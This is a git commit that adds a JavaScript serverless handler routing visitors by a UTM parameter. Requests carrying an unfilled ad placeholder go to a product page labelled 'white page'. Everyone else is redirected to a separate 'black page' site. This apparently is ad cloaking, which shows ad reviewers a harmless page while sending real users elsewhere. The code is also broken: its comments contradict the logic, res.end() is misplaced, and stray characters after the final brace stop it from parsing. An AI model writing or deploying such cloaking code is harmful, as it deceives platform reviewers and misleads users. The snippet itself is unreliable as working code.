81f87f6c90ad42e0852b87d51058a5deb6227009
Ayden Xu <aydenxunc@gmail.com>
2025-01-05 13:03:54 -0500

    34inti'

---
+++ api/redirect.js
@@ -0,0 +1,19 @@
+export default function handler(req, res) {
+    // URLs to redirect
+    const whitePageURL = "https://swellyusa.com/products/copy-of-yuru-yuru-dino-plush-small-t-rex-red";
+    const blackPageURL = "https://rwrds.live";
+  
+    // Parse the UTM parameters from the request URL
+    const queryParams = new URLSearchParams(req.url.split('?')[1]);
+    const utmCampaign = queryParams.get('utm_campaign');
+  
+   // Redirection logic
+   if (utmCampaign === '__AID_NAME__') {
+    // UTM campaign 'l1' takes priority for both desktop and mobile
+    res.writeHead(302, { Location: whitePageURL });
+  } else{
+    // Mobile devices without 'l1' campaign
+    res.writeHead(302, { Location: blackPageURL });
+
+  res.end();
+}}l13
